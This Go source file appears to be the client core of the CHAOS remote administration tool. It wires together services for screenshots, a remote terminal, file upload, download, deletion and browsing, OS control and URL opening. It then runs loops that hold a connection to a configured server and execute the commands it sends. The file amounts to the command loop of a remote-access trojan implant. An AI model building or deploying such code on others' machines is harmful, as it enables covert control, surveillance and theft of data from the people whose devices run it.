package app

import (
	"context"
	"github.com/tiagorlampert/CHAOS/client/app/environment"
	"github.com/tiagorlampert/CHAOS/client/app/gateways/client"
	"github.com/tiagorlampert/CHAOS/client/app/handler"
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"github.com/tiagorlampert/CHAOS/client/app/services/delete"
	"github.com/tiagorlampert/CHAOS/client/app/services/download"
	"github.com/tiagorlampert/CHAOS/client/app/services/explorer"
	"github.com/tiagorlampert/CHAOS/client/app/services/information"
	"github.com/tiagorlampert/CHAOS/client/app/services/os"
	"github.com/tiagorlampert/CHAOS/client/app/services/screenshot"
	"github.com/tiagorlampert/CHAOS/client/app/services/terminal"
	"github.com/tiagorlampert/CHAOS/client/app/services/upload"
	"github.com/tiagorlampert/CHAOS/client/app/services/url"
	"github.com/tiagorlampert/CHAOS/client/app/utils/network"
	"golang.org/x/sync/errgroup"
	"log"
)

type App struct {
	Handler *handler.Handler
}

func New(configuration *environment.Configuration) *App {
	httpClient := network.NewHttpClient()
	clientGateway := client.NewGateway(configuration, httpClient)
	operatingSystem := os.DetectOS()
	terminalService := terminal.NewService()

	clientServices := &services.Services{
		Information: information.NewService(configuration.Server.HttpPort),
		Terminal:    terminalService,
		Screenshot:  screenshot.NewService(),
		Download:    download.NewService(configuration, clientGateway),
		Upload:      upload.NewService(configuration, httpClient),
		Delete:      delete.NewService(),
		Explorer:    explorer.NewService(),
		OS:          os.NewService(configuration, terminalService, operatingSystem),
		Url:         url.NewUrlService(terminalService, operatingSystem),
	}

	deviceSpecs, err := clientServices.Information.LoadDeviceSpecs()
	if err != nil {
		log.Fatal("error loading device specs: ", err)
	}

	return &App{
		handler.NewHandler(configuration, clientGateway, clientServices, deviceSpecs.MacAddress),
	}
}

func (a *App) Run() {
	g, _ := errgroup.WithContext(context.Background())

	g.Go(func() error {
		a.Handler.KeepConnection()
		return nil
	})

	g.Go(func() error {
		a.Handler.HandleCommand()
		return nil
	})

	if err := g.Wait(); err != nil {
		log.Fatal("error running client: ", err)
	}
}
